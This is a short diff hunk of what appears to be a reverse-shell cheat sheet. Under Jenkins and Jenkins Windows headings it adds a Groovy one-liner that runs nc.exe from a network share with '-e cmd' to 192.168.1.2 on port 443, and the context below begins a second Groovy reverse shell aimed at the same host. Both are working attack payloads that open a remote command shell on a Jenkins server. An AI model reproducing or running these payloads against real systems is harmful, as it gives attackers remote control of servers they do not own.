@@ -329,10 +329,16 @@
   }
   ```
   
+  ---
+   
   # <kbd>Jenkins</kbd>
   
   # <kbd>Jenkins Windows</kbd> 
   
+  ```cmd
+  println "\\\\192.168.1.2\\a\\nc.exe -e cmd 192.168.1.2 443" .execute().text
+  ```
+   
   ```cmd
   String host="192.168.1.2";
   int port=443;
